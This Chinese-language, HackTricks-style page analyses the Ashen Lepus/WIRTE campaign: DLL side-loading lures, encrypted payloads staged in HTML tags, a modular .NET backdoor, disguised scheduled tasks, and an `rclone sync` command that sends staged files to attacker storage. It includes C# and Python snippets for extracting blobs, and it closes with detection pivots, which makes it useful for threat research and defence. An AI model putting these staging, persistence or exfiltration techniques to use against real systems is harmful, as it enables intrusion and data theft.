# 高级 DLL Side-Loading 与 HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 战术概述

Ashen Lepus (aka WIRTE) 将一套可复用的模式武器化，该模式将 DLL sideloading、分段 HTML payloads 和模块化 .NET backdoors 串联起来，以在中东外交网络中保持持久性。该技术可被任何操作者复用，因为它依赖于：

- **Archive-based social engineering**: 表面无害的 PDFs 指示目标从文件共享站点下载一个 RAR 归档。该归档捆绑了一个看起来真实的文档查看器 EXE、一个以受信任库命名的恶意 DLL（例如 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`），以及一个诱饵 `Document.pdf`。
- **DLL search order abuse**: 受害者双击 EXE，Windows 从当前目录解析 DLL 导入，恶意加载器 (AshenLoader) 在受信任进程内执行，同时诱饵 PDF 打开以避免怀疑。
- **Living-off-the-land staging**: 之后的每个阶段 (AshenStager → AshenOrchestrator → modules) 都不落地到磁盘，按需以加密 blobs 的形式隐藏在看似无害的 HTML 响应中传送。

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE 侧载 AshenLoader，后者执行主机侦察，将其用 AES-CTR 加密，并通过 POST 把它放入诸如 `token=`、`id=`、`q=` 或 `auth=` 等轮换参数中，发送到看似 API 的路径（例如 `/api/v2/account`）。
2. **HTML extraction**: C2 只有在客户端 IP 定位到目标区域且 `User-Agent` 与 implant 匹配时才透露下一阶段，从而使沙箱失效。当检查通过时，HTTP 正文包含一个 `<headerp>...</headerp>` blob，内含 Base64/AES-CTR 加密的 AshenStager payload。
3. **Second sideload**: AshenStager 与另一个导入 `wtsapi32.dll` 的合法二进制一起部署。注入到该二进制的恶意副本获取更多 HTML，这次从 `<article>...</article>` 中提取以恢复 AshenOrchestrator。
4. **AshenOrchestrator**: 一个模块化的 .NET 控制器，用于解码 Base64 编码的 JSON 配置。该配置的 `tg` 和 `au` 字段被串联/哈希为 AES 密钥，用来解密 `xrk`。解密得到的字节随后作为对之后获取的每个 module blob 的 XOR 密钥。
5. **Module delivery**: 每个模块通过 HTML 注释描述，这些注释会将解析器重定向到任意标签，打破仅查找 `<headerp>` 或 `<article>` 的静态规则。模块包括持久化（`PR*`）、卸载程序（`UN*`）、侦察（`SN`）、屏幕捕获（`SCT`）以及文件探索（`FE`）。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
即使防御者阻止或移除特定元素，操作者只需更改 HTML 注释中提示的标签即可恢复投递。

### 快速提取助手 (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML 分阶段规避的相似点

最近的 HTML smuggling 研究 (Talos) 强调在 HTML 附件的 `<script>` 块内将 payload 隐藏为 Base64 字符串，并在运行时通过 JavaScript 解码。相同技巧可用于 C2 响应：在 script 标签（或其他 DOM 元素）内分阶段放置加密 blob，并在内存中在 AES/XOR 之前解码，使页面看起来像普通 HTML。Talos 还展示了在 script 标签内的分层混淆（标识符重命名加 Base64/Caesar/AES），这与 HTML-staged C2 blobs 映射契合。

## Recent Variant Notes (2024-2025)

- Check Point 观察到 2024 年的 WIRTE 活动仍依赖基于归档的 sideloading，但使用 `propsys.dll` (stagerx64) 作为第一阶段。该 stager 使用 Base64 + XOR（key `53`）解码下一个 payload，使用硬编码的 `User-Agent` 发送 HTTP 请求，并提取嵌入在 HTML 标签之间的加密 blob。在一个分支中，该阶段从一长串嵌入的 IP 字符串通过 `RtlIpv4StringToAddressA` 解码后重建，然后串联为 payload 字节。
- OWN-CERT 记录了早期的 WIRTE 工具链，其中侧加载的 `wtsapi32.dll` dropper 使用 Base64 + TEA 保护字符串，并使用 DLL 名称本身作为解密密钥，然后在发送到 C2 之前对主机识别数据进行 XOR/Base64 混淆。

## Crypto & C2 Hardening

- **AES-CTR everywhere**: 当前的 loaders 嵌入 256-bit keys 以及 nonces（例如 `{9a 20 51 98 ...}`），并可选地在解密前/后使用诸如 `msasn1.dll` 之类的字符串添加一层 XOR。
- **Key material variations**: 早期的 loaders 使用 Base64 + TEA 来保护嵌入字符串，解密密钥从恶意 DLL 名称派生（例如 `wtsapi32.dll`）。
- **Infrastructure split + subdomain camouflage**: 分阶段服务器按工具分离，托管于不同的 ASN，且有时通过看起来合法的子域进行前置，因而烧掉一阶段并不会暴露其余部分。
- **Recon smuggling**: 枚举的数据现在包括 Program Files 列表以识别高价值应用，并始终在离开主机前进行加密。
- **URI churn**: 查询参数和 REST 路径在活动之间轮换（`/api/v1/account?token=` → `/api/v2/account?auth=`），使脆弱的检测失效。
- **User-Agent pinning + safe redirects**: C2 基础设施仅对精确的 UA 字符串响应，否则重定向到无害的新闻/健康网站以混淆视听。
- **Gated delivery**: 服务器进行地理围栏，仅对真实 implant 响应。未授权的客户端收到不显眼的 HTML。

## Persistence & Execution Loop

AshenStager 会投放伪装成 Windows 维护任务的 scheduled tasks 并通过 `svchost.exe` 执行，例如：

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

这些任务在启动或按间隔重新启动 sideloading chain，确保 AshenOrchestrator 可以在不再次触及磁盘的情况下请求新模块。

## Using Benign Sync Clients for Exfiltration

操作者通过专用模块将外交文件暂存到 `C:\Users\Public`（对所有用户可读且不显眼），然后下载合法的 [Rclone](https://rclone.org/) 二进制同步该目录到攻击者存储。Unit42 指出，这是该行为体首次被观察到使用 Rclone 进行外传，这与滥用合法同步工具以融入正常流量的更大趋势一致：

1. **Stage**: 将目标文件复制/收集到 `C:\Users\Public\{campaign}\`。
2. **Configure**: 部署一个指向攻击者控制的 HTTPS 端点（例如 `api.technology-system[.]com`）的 Rclone 配置。
3. **Sync**: 运行 `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`，使流量看起来像正常的云备份。

由于 Rclone 广泛用于合法备份工作流，防御者必须关注异常执行（新二进制、异常的 remotes，或突然对 `C:\Users\Public` 的同步）。

## Detection Pivots

- 对意外从用户可写路径加载 DLL 的 **signed processes** 发出告警（Procmon 过滤 + `Get-ProcessMitigation -Module`），尤其当 DLL 名称与 `netutils`、`srvcli`、`dwampi` 或 `wtsapi32` 重叠时。
- 检查可疑的 HTTPS 响应中是否有 **嵌入在不寻常标签内的大型 Base64 blob** 或被 `<!-- TAG: <xyz> -->` 注释保护的内容。
- 将 HTML 搜索扩展到 **`<script>` 块内的 Base64 字符串**（HTML smuggling-style staging），该字符串在 AES/XOR 处理前通过 JavaScript 解码。
- 搜索运行 `svchost.exe` 带非服务参数或指回 dropper 目录的 **scheduled tasks**。
- 跟踪仅对精确 `User-Agent` 字符串返回 payload 而对其他请求重定向到合法新闻/健康域的 **C2 重定向**。
- 监控出现在非 IT 管理位置的 **Rclone** 二进制、新的 `rclone.conf` 文件，或从像 `C:\Users\Public` 这样的暂存目录拉取的同步作业。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
